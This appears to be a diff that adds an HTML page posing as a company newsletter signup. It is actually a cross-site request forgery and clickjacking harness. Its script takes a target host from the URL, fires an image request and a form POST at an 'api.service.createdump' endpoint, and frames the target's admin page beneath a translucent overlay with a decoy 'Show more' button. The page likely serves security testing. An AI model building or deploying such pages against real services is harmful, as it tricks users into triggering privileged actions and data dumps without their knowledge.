@@ -1,3 +1,81 @@
-<div>
-	<img src="http://localhost:7000/api.service.createdump" alt="dump">
-</div>
+<body style="margin: 0">
+
+	<header style="padding: 8px 24px; background-color: #00b4ec; color: white">
+		<img id="img">
+		Compane name
+	</header>
+	
+	<section style="padding: 8px 24px; text-align: center;">
+		<h2>Subscribe to our nesletter</h2>
+		<form id="form" method="post">
+			<button
+				style="
+					height: 40px;
+					width: 125px;
+				"
+				type="submit">Subscribe</button>
+		</form>
+	</section>
+
+	<section style="padding: 8px 24px; text-align: center; background-color: #00b4ec;">
+		<div style="position: relative; display: inline-block">
+			<iframe id="iframe"
+				title="iframe"
+				width="180"
+				height="425">
+			</iframe>
+			<div
+				style="
+				position: absolute;
+				top: 0;
+				bottom: 0;
+				left: 0;
+				right: 0;
+				opacity: 0.9;
+				pointer-events: none;
+				background-color: #00b4ec;
+				color: white
+			">
+				<h2 style="
+					position: absolute;
+					left: -30px;
+					width: 320px;
+				">See more about our product</h2>
+				<button
+					type="button"
+					style="
+					position: relative;
+					height: 40px;
+					width: 125px;
+					top: 250px;
+					left: 40px;
+				">Show more</button>
+			</div>
+		</div>
+	</section>
+
+
+	
+	<script>
+		const q = location.search.substr(1).split('&');
+		const host = q[0].split('=')[1];
+		const port = q[1].split('=')[1];
+		const secure = q[2].split('=')[1];
+		const target = `${secure === 'true' ? 'https://' : 'http://'}${host}:${port}`;
+		const wstarget = `${secure === 'true' ? 'wss://' : 'ws://'}${host}:${port}`;
+
+		const ws = new WebSocket(wstarget);
+
+		const img = document.querySelector('#img');
+		const form = document.querySelector('#form');
+		const iframe = document.querySelector('#iframe');
+		
+		const action = 'api.service.createdump';
+		
+		img.src = `${target}/${action}`;
+		form.action = `${target}/${action}`;
+		iframe.src = `${target}/admin`;
+		
+		//form.submit();
+	</script>
+</body>
